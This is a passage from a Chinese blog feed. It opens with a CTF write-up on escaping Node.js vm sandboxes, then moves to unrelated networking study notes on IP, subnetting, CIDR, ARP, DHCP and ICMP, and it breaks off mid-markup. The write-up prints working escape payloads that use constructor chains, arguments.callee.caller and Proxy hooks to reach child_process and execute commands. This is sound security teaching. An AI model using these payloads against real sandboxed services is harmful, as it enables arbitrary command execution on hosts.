= &#123;<br>    <span class="hljs-attr">x</span>: []<br>&#125;;<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">&#x27;x.constructor.constructor(&quot;return process&quot;)()&#x27;</span>,sandbox);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><blockquote><p>但是如果x是是数字、字符串等primitive类型就无法逃逸出来，因为他们在传参的时候将数值传递过去，而不是引用属性，无法进一步调用<code>constructor</code></p></blockquote></li><li><p><strong>runInNewContext</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)();&#x27;</span>;<br><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInNewContext</span>(code);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><p>原理和上面的runInContext一样。</p></li><li><p><strong>new vm.Script(code, options)</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;</span>)<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">x</span>:[]&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br></code></pre></td></tr></table></figure><p>这里同理。</p></li></ul><h2 id="vm绕过Object-create-null"><a href="#vm绕过Object-create-null" class="headerlink" title="vm绕过Object.create(null)"></a>vm绕过Object.create(null)</h2><p>当我们的sandbox沙箱对象设置为null时，就无法通过this.construtor来获取Function的构造函数</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&quot;this.constructor.constructor(&#x27;return process&#x27;)().env&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-title function_">runInContext</span>(code,sandbox));<br></code></pre></td></tr></table></figure><p>上面的函数就会报如下错误</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309183122332.png" alt="image-20240309183122332"></p><p>绕过一种方法就是利用<strong>arguments.callee.caller</strong></p><p>这里了解一下arguments是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">arguments 是一个类数组对象，它包含了传递给当前函数的所有参数。<br><br>arguments.callee 是 arguments 对象的一个属性，它表示当前正在执行的函数本身。<br><br>arguments.callee.caller 是 arguments.callee 对象的一个属性，它表示调用当前正在执行的函数的那个函数，也就是调用当前函数的外部函数。<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">foo</span>();<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">baz</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">bar</span>();<br>&#125;<br><span class="hljs-title function_">foo</span>();<br><span class="hljs-title function_">bar</span>();<br><span class="hljs-title function_">baz</span>();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309183741062.png" alt="image-20240309183741062"></p><p>那思路就是在沙箱内定义一个函数，在沙箱外调用这个函数，那么这个函数的arguments.callee.caller则会返回沙箱外的一个对象，那么我们我们就可以在沙箱内进行逃逸了</p><p>那么下面的写法就可以进行绕过：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125;</span><br><span class="hljs-string">    a.toString = function () &#123;</span><br><span class="hljs-string">      const cc = arguments.callee.caller;</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span> + res);<br></code></pre></td></tr></table></figure><blockquote><p>说一下大概流程：</p><p>这里在沙箱内定义了一个函数将toString()进行了重写，我们在vm.runInContext(func, context)这里执行了该函数重写toString后返回了沙箱内的a对象，然后console.log的时候默认执行了toString()方法，这个时候cc获得的就是外部执行对象，然后我们就成功进行了逃逸。</p><p>这里也可以自己去调试一下会更加清晰。</p></blockquote><p>如果无法重写或触发toString()方法，还可以利用<strong>Proxy</strong>来劫持属性</p><p><strong>这里了解一下Proxy：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Proxy 对象是 JavaScript 提供的一个内置对象，它可以用来创建一个代理，用于拦截和修改目标对象的一些基本操作，例如属性的读取、赋值、删除、枚举、函数的调用等<br><br>Proxy 对象的用法是：<br><br>创建一个 Proxy 对象，需要使用 new Proxy(target, handler) 构造函数，传入两个参数，分别是目标对象和处理器对象。<br>目标对象是要被代理的对象，可以是任何类型的对象，例如数组、函数、另一个代理等。<br>处理器对象是一个普通的对象，它定义了一些拦截函数（也称为陷阱），用于拦截和修改目标对象的基本操作。<br></code></pre></td></tr></table></figure><p>这是一个例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//get</span><br><span class="hljs-keyword">let</span> numbers=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<br>numbers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers,&#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>        <span class="hljs-keyword">if</span> (prop <span class="hljs-keyword">in</span> target) &#123;<br>          <span class="hljs-keyword">return</span> target[prop];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 默认值</span><br>        &#125;<br>      &#125;<br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">1</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">123</span>]);<br><br><span class="hljs-comment">//set</span><br><span class="hljs-keyword">let</span> numbers1 = [];<br><br>numbers1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers1, &#123; <span class="hljs-comment">// (*)</span><br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, val</span>) &#123; <span class="hljs-comment">// 拦截写入操作</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(val) == <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>      target[prop] = val;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>  &#125;<br>&#125;);<br><br>tmp=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;ceshi&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp));<br>tmp1=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp1));<br></code></pre></td></tr></table></figure><p>下面是利用get钩子和set钩子来进行逃逸的例子</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//利用get钩子逃逸</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> script =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><blockquote><p>这里的原理就是在沙箱外部访问了代理对象的任意属性，即使属性不存在也会自动调用钩子函数，这样就和上面一样得到了外部对象然后进行命令执行</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//利用set钩子</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        set: function(my,key, value) &#123;</span><br><span class="hljs-string">        (value.constructor.constructor(&#x27;return process&#x27;))().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br>res[<span class="hljs-string">&#x27;&#x27;</span>]=&#123;&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这里的原理就是为代理对象添加属性时会自动调用set钩子，那么就达到了获取外部对象的目的，然后成功命令执行</p></blockquote><p>上面的过程也可以去调试一下代码会更加清晰运行过程。</p><h1 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h1><p>参考文章：<a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQuD=CNcDID&alichlgref=https://www.google.com/#toc-3">NodeJS VM和VM2沙箱逃逸 - 先知社区 (aliyun.com)</a></p><p>vm2的具体实现原理参考这篇文章：<a href="https://www.anquanke.com/post/id/207283">vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>vm2在vm的基础上进行了优化，比较重要的就是利用了Proxy代理，使用钩子拦截constructor和__ proto __这些属性的访问。</p><p>网上看好像vm2的代码在3.9版本之后大幅修改，结构变成下面这样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310022305060.png" alt="image-20240310022305060"></p><p>和上面的文章文件结构都不一样，不过使用的方法没有变化。</p><p>我们用到的vm2的沙箱环境是通过main.js导出的VM和NodeVM，还有一个VMScript是封装了vm.Script</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310100756542.png" alt="image-20240310100756542"></p><p>vm2执行代码示例如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//vm2</span><br><span class="hljs-keyword">const</span>&#123;<span class="hljs-variable constant_">VM</span>,<span class="hljs-title class_">VMScript</span>&#125;=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<span class="hljs-comment">//解构赋值，从中提取vm2的VM和VMScript</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">&quot;let a = 2;a&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><blockquote><p>VM 是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化之后调用 <code>run</code> 方法即可运行一段脚本。</p></blockquote><p>上述代码的具体运行原理我就贴个图，具体的要去看文章，因为代码结构变了在新的vm2中</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310101817366.png" alt="image-20240310101817366"></p><p>还有一篇文章分析了两个案例：<a href="https://www.anquanke.com/post/id/207291">vm2沙箱逃逸分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>这里找几道题分析吧，vm2原理看得头大。</p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>这题在buu上面有</p>]]></content>
      
      
      <categories>
          
          <category> ctf web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web ctf nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-4</title>
      <link href="/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/"/>
      <url>/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/</url>
      
        <content type="html"><![CDATA[<!-- toc --><h1 id="网络层概述"><a href="#网络层概述" class="headerlink" title="网络层概述"></a>网络层概述</h1><p>这里放个导图</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306232043207.png" alt="image-20240306232043207"></p><p>网络层主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。</p><p>网络层传输单位是数据报。</p><p><strong>网络层的功能</strong></p><ul><li><p>功能一:路由选择与分组转发(选择最佳路径)</p></li><li><p>功能二:异构网络互联</p></li><li><p>功能三:拥塞控制</p><p>若所有结点都来不及接受分组，而要丢弃大量分组的话，网络就处于拥塞状态。因此要采取一定措施缓解这种拥塞；</p><p>拥塞控制有两种方法：</p><ul><li>开环控制：这是静态的，即提前考虑网络会产生拥塞的各种情况并做好准备</li><li>闭环控制：这是动态的，即在网络运行的时候进行实时调整</li></ul></li></ul><h1 id="IP数据报格式"><a href="#IP数据报格式" class="headerlink" title="IP数据报格式"></a>IP数据报格式</h1><p>IP协议在网络层的占比很大</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307125809633.png" alt="image-20240307125809633"></p><p><strong>ip数据包的整体结构</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307141005938.png" alt="image-20240307141005938"></p><p>数据部分就是传输层的报文段</p><p><strong>具体格式</strong><br><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307141105140.png" alt="image-20240307141105140"></p><h1 id="IP数据报分片"><a href="#IP数据报分片" class="headerlink" title="IP数据报分片"></a>IP数据报分片</h1><p><strong>最大传送单元MTU</strong></p><p>链路层数据帧可封装的数据的上限</p><p>以太网的MTU是1500字节</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307141645466.png" alt="image-20240307141645466"></p><p>链路层的数据帧的数据部分就是IP分组，所以IP分组大小不能超过MTU，以太网就是不能超过1500字节；如果超过了MTU就要采取数据报分片的方法。</p><p><strong>分片</strong></p><p>分片的就和上面数据报中的标识、标志、片偏移三个部分相关</p><ul><li><p>标识：同一数据报的分片使用同一标识。比如有三个数据报他们的标识都是888，那他们就是属于同一个数据报，最后会重新组合成一个完整的数据报。</p></li><li><p>标志：只有两位有意义</p><p>中间位DF（Don’t Fragment）：DF&#x3D;1,禁止分片；DF&#x3D;0，允许分片。</p><p>最低位MF（More Fragment）：MF&#x3D;1，后面还有分片；MF&#x3D;0，代表最后一片&#x2F;没分片。</p><p>最低位要在DF为0是才有讨论意义</p></li><li><p>片偏移：指出较长分组分片后，某片在原分组中的相对位置，以8B为单位。</p><p>比如片偏移字段为0000000000001，则代表该分片在8B的位置开始。</p><p>所以除了最后一个分片不一定，每个分片的长度一定是8B的整数倍。</p></li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>一个很基础的例题，对上面一些概念的运用和简单计算</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307143646764.png" alt="image-20240307143646764"></p><h1 id="IPv4地址"><a href="#IPv4地址" class="headerlink" title="IPv4地址"></a>IPv4地址</h1><h2 id="IP分类的历史阶段"><a href="#IP分类的历史阶段" class="headerlink" title="IP分类的历史阶段"></a>IP分类的历史阶段</h2><p>分类的IP地址&#x3D;》子网的划分&#x3D;》构成超网(无分类编址方法)</p><h2 id="分类的IP地址"><a href="#分类的IP地址" class="headerlink" title="分类的IP地址"></a>分类的IP地址</h2><p>IP地址：唯一的32位&#x2F;4字节标识符，标识路由器主机的接口</p><p>IP地址&#x3D;{&lt;网络号&gt;,&lt;主机号&gt;}</p><p>为了方便人阅读，采用点分十进制的转换法</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307144802830.png" alt="image-20240307144802830"></p><p><strong>各类别IP地址划分</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307145139846.png" alt="image-20240307145139846"></p><p><strong>特殊IP地址</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307145608889.png" alt="image-20240307145608889"></p><p><strong>私有IP地址</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307145720156.png" alt="image-20240307145720156"></p><p><strong>可用网络号和主机数计算</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307150107170.png" alt="image-20240307150107170"></p><blockquote><p>主机数需要减去全0和全1两种特殊情况</p><p>网络数A类需要减去全0和127，B类和C类只要减去全0</p></blockquote><h1 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h1><p>因为路由器对目的地址是私有IP地址的数据报一律不进行转发，那我们平时上网是怎么去外界通信呢，就是用到了NAT技术。</p><p><strong>网络地址转换NAT(NetworkAddress Translation)：</strong>在专用网连接到因特网的路由器上安装NAT软件，安装了NAT软件的路由器叫NAT路由器，它至少有一个有效的外部全球IP地址。这是一个示例图</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307151440901.png" alt="image-20240307151440901"></p><h1 id="子网划分与子网掩码"><a href="#子网划分与子网掩码" class="headerlink" title="子网划分与子网掩码"></a>子网划分与子网掩码</h1><h2 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h2><p>就是将**{&lt;网络号&gt;,&lt;主机号&gt;}<strong>这样的两级IP地址变成</strong>{&lt;网络号&gt;,&lt;子网号&gt;,&lt;主机号&gt;}**这样的三级IP地址；不过外界是不知道内部的子网如何划分的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307152212955.png" alt="image-20240307152212955"></p><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>网络号(子网号也是)对应的二进制位全为1，主机号则全为0。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307221224860.png" alt="image-20240307221224860"></p><blockquote><p>子网掩码与IP地址逐位相与，就得到子网网络地址</p></blockquote><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>已知IP地址141.14.72.24，子网掩码是255.255.192.0，求网络地址</p><p>直接中间8位的192写出来和72一与就可以得到64，所以子网网络号为141.14.64.0。</p><h2 id="使用子网时的分组转发"><a href="#使用子网时的分组转发" class="headerlink" title="使用子网时的分组转发"></a>使用子网时的分组转发</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307222755852.png" alt="image-20240307222755852"></p><h1 id="无分类编址CIDR"><a href="#无分类编址CIDR" class="headerlink" title="无分类编址CIDR"></a>无分类编址CIDR</h1><p><strong>CIDR消除了传统的A类，B类和C类地址以及划分子网的概念；网络号和子网号统一变成网络前缀。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307230252926.png" alt="image-20240307230252926"></p><blockquote><p>CIDR的写法是IP地址后加上&#x2F;，然后写上网络前缀的位数，比如：128.14.32.0&#x2F;20</p></blockquote><p><strong>CIDR融合子网地址与子网掩码，方便子网划分</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307230656231.png" alt="image-20240307230656231"></p><h2 id="构成超网"><a href="#构成超网" class="headerlink" title="构成超网"></a>构成超网</h2><p>将多个子网聚合成一个较大的子网，叫做构成超网，或路由聚合。</p><p>其方法就是将网络前缀缩短，在所有的网络地址取交集。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307231403673.png" alt="image-20240307231403673"></p><p>比如上面的IP地址的交集就是前16位，然后就把前16位当作新的网络前缀。</p><h2 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h2><p>使用CIDR时，查找路由表可能得到几个匹配结果(跟网络掩码按位相与)，应选择具有最长网络前缀的路由。<br>前缀越长，地址块越小，路由越具体。</p><p>下面是一个例子：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308001842598.png" alt="image-20240308001842598"></p><p>目的地址分别与上述路由表中的所有地址块进行匹配，左边两个都能成功匹配到网络号，而计算机系的网络前缀最长，所以会发送给计算机系。</p><h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><p>ARP协议有点类似于网络层和链路层的一个中间协议，因为ARP协议就是完成主机或路由器IP地址到MAC地址的映射，也就是解决下一跳走哪的问题。</p><blockquote><p>在实际网络的链路上传输数据帧时，最终必须使用MAC地址</p></blockquote><p><strong>ARP协议使用过程</strong></p><p>检查ARP高速缓存，有对应表项则写入MAC帧，没有则用目的MAC地址为FF-FF-FF-FF-FF-FF的帧封装并广播ARP请求分组，同一局域网中所有主机都能收到该请求。目的主机收到请求后就会向源主机单播一个ARP响应分组，源主机收到后将此映射写入ARP缓存(10-20min更新一次)。</p><p><strong>ARP协议的四种典型情况</strong></p><ol><li><p>主机A发给本网络上的主机B:用ARP找到主机B的硬件地址;</p></li><li><p>主机A发给另一网络上的主机B:用ARP找到本网络上一个路由器(网关)的硬件地址；</p></li><li><p>路由器发给本网络的主机A:用ARP找到主机A的硬件地址；</p></li><li><p>路由器发给另一网络的主机B:用ARP找到本网络上的一个路由器的硬件地址。</p></li></ol><p><strong>下面用向本局域网主机发送数据和向其他局域网主机发送数据的两个例子来说明ARP协议的运用</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308153147166.png" alt="image-20240308153147166"></p><p>现在是向本局域网内的3号主机发送数据，首先会在本地的ARP高速缓存中检查有没有3号主机对应的mac地址，没有的话就会另IP3为全1发送一个广播分组，交换机收到请求之后就会发送给所有主机，所有主机收到请求后，如果是对应的IP地址就会返回一个单播ARP响应分组，其中就包含了自己的mac地址。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308154025422.png" alt="image-20240308154025422"></p><p>这是向非局域网内的5号主机传输数据，会先将IP5与自己的子网掩码相与一下看是否在同一个网段，如果不在就直接跳到自己的默认网关，局域网内的主机都知道自己的默认网关地址，然后就可以发送广播分组得到默认网关的mac地址，然后这里就填上mac6发送到默认网关，后面的mac地址的改变调整是路由器转发数据出去时自己内部改变的，包含自身mac地址和要去的mac地址。</p><blockquote><p>交换机是没有mac地址的，要主机和路由器接口才有。</p><p>默认网关就是本局域网和外界通信的一个接口。</p></blockquote><h1 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h1><h2 id="主机要如何获得IP地址"><a href="#主机要如何获得IP地址" class="headerlink" title="主机要如何获得IP地址"></a>主机要如何获得IP地址</h2><ol><li><p>静态配置：也就是管理由手动配置<strong>IP地址</strong>，<strong>子网掩码</strong>，<strong>默认网关</strong>这些东西</p></li><li><p>动态配置：这就是利用DHCP服务器来给局域网内的主机自动分配一个IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308155102460.png" alt="image-20240308155102460"></p></li></ol><h2 id="DHCP工作过程"><a href="#DHCP工作过程" class="headerlink" title="DHCP工作过程"></a>DHCP工作过程</h2><p><strong>动态主机配置协议DHCP是应用层协议，</strong>使用客户&#x2F;服务器方式，客户端和服务端通过广播方式进行交互，基于UDP。</p><p>DHCP提供即插即用联网的机制，主机可以从服务器动态获取IP地址、子网掩码、默认网关、DNS服务器名称与IP地址，允许地址重用，支持移动用户加入网络，支持在用地址续租。</p><p><strong>流程</strong></p><ol><li>主机广播DHCP发现报文，也就是探测网络中是否有DHCP服务器，请求获得IP地址</li><li>DHCP服务器广播DHCP提供报文，收到请求的服务器如果有空闲的IP地址及其相关配置都会广播发送出去</li><li>主机广播DHCP请求报文，收到多个提供报文，选择其中的一个IP地址使用(先到先得)，广播发送确认使用该IP地址</li><li>DHCP服务器广播DHCP确认报文，正式将该IP分配给主机</li></ol><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>ICMP协议起到传输层和网络层的桥梁作用。</p><p>ICMP协议支持主机或路由器，在网络层的分组出错时，在分组被丢弃之后需要发送一个差错(或异常报告)，也就是发送特定ICMP报文：ICMP差错报文，ICMP询问报文</p><h2 id="ICMP结构"><a href="#ICMP结构" class="headerlink" title="ICMP结构"></a>ICMP结构</h2><p>ICMP报文是装在IP数据报的数据部分</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309000752280.png" alt="image-20240309000752280"></p><h2 id="ICMP的5种差错报告报文"><a href="#ICMP的5种差错报告报文" class="headerlink" title="ICMP的5种差错报告报文"></a>ICMP的5种差错报告报文</h2><ol><li>终点不可达：当路由器或主机不能交付数据报时就向源点发送终点不可达报文，即无法交付</li><li>源点抑制：当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据报的发送速率放慢，在网络拥塞丢失数据是发生；<strong>不过现在已经不用这种报文了</strong>。</li><li>时间超过：当路由器收到生存时间TTL&#x3D;0的数据报时，除丢弃该数据报外，还要向源点发送时间超过报文。终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文，即 TTL&#x3D;0时。</li><li>参数问题：当路由器或目的主机收到的数据报的首部中有的字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文。首部字段有问题时发生。</li><li>改变路由(重定向)：路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器<br>，选择更好的路由。</li></ol><p><strong>ICMP差错报告报文数据格式</strong></p><p><img 